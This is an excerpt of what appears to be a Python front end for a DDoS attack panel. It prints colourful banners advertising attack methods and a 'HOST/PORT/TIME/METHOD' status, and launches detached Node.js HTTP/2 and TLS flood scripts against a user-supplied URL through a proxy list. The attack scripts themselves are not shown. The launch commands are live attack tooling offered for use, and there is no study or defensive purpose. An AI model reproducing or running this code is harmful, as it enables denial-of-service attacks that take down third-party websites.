...
""")))
    ...
    print(f""" \x1b[0m𝙻𝚘𝚐𝚒𝚗 𝚊𝚜 : [ \x1b[34m{logged_in_user}\x1b[0m ]\x1b[0m | 𝙼𝚊𝚡 𝚃𝚒𝚖𝚎 [ \x1b[34m2000\x1b[0m ] | 𝚂𝚝𝚊𝚝𝚞𝚜 [ \x1b[34mOwner\x1b[0m ] 
          | 𝚅𝙸𝙿 [ \x1b[34mTrue\x1b[0m ] | \x1b[34m30384948.99 \x1b[0m 𝙼𝚒𝚕𝚕𝚎𝚗𝚗𝚒𝚞𝚖 (𝚜)""")
    print(Colorate.Horizontal(Colors.DynamicMIX((Col.light_blue, Col.red)),('''─''' * 70)))
    print(f""" 𝙿𝚕𝚎𝚊𝚜𝚎 𝚝𝚢𝚙𝚎 "\x1b[34mHelp\x1b[0m" 𝙾𝚛 "\x1b[34mMethods\x1b[0m" 𝚂𝚑𝚘𝚠 𝙰𝚕𝚕 𝙰𝚝𝚝𝚊𝚌𝚔 𝙲𝚘𝚖𝚖𝚊𝚗𝚍""")
...
#########LAYER-4 - 7########
            ...
            try:
                ...
                if ip:
                    ...
                    print(f"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⡸⠁⠘⢉⣷⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣰⠁⠀⠀\033[34m⢀⡇⣇⡰⠲⣆⠀⠀⠀⠀ \033[1;34mＰＯＷＥＲＥＤ ＢＹ ： [ • ＣｏｄｅＳｙｎｔａｘ • ]\033[0m
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⡴⠁⠀⠀\033[34m⢰⣾⡦⣾⠁⠀⢸⡆⠀⠀⠀ \033[34m\033[48;5;15m\033[1;35mATTACK - DETAILS\033[0m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣀⣤⢴⠞⠁⠀⠀⠀\033[34m⠘⡆⣀⣿⠀⠀⡼⠀⠀⠀⠀    \033[34m\033[1;37mSTATUS:      \033[31m[\033[34m ATTACK SENT SUCCESSFULLY\033[31m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⡱⣶⡾⠀⠀⠀⠀⠀⠀\033[34m⣿⠋⠀⠀⢰⠃⠀⠀⠀⠀    \033[34m\033[1;37mHOST:        \033[31m[\033[34m {url}\033[31m ]
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢸⡧⠏⠀⠀⠀⠀⠀⠀⠀\033[34m⠁⠀⣀⡴⣿⠀⠀⠀⠀⠀    \033[34m\033[1;37mPORT:        \033[31m[\033[34m {port}\033[31m ]
⠀⠀⠀⠀⠀⠀⠀⣴⠃⠀⢸⣿⣾⠀⠀⠀⠀⠀⠀\033[34m⣜⣀⣾⠿⣷⣿⠀⠀⠀⠀⠀    \033[34m\033[1;37mTIME:        \033[31m[\033[34m {duration}\033[31m ]
⠀⠀⠀⠀⠀⠀⣸⡿⠀⢠⣄⠸⢹⣷⠀⠀⢆⠀⠀\033[34m⣏⡿⠉⠀⠈⢹⡀⠀⠀⠀⠀    \033[34m\033[1;37mMETHOD:      \033[31m[\033[34m {sinput}\033[31m ]
⠀⠀⠀⠀⠀⣠⠟⠀⣤⠀⣿⠃⠞⢹⣶⣰⣼⠀⠀⠉⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀    \033[34m\033[1;37mSTART ATTACK:\033[31m[\033[34m {waktu()} \033[31m]
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node chaptcha2.js {url} {duration} 32 4 proxy.txt')
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node storm2.js {url} {duration} 32 4 proxy.txt')
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node h2-rape.js {url} {duration} 32 4 proxy.txt')
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node h2-kill.js {url} {duration} 32 4 proxy.txt')
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node tlsv2.js {url} {duration} 32 4 proxy.txt')
...
⠀⠀⠀⠀\033[31m⠘⠸⠿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[34m⠈⢀⣿⠛ 
""")
                    os.system(f'cd l7 && screen -dm node mixbill.js {url} {duration} 100 5')
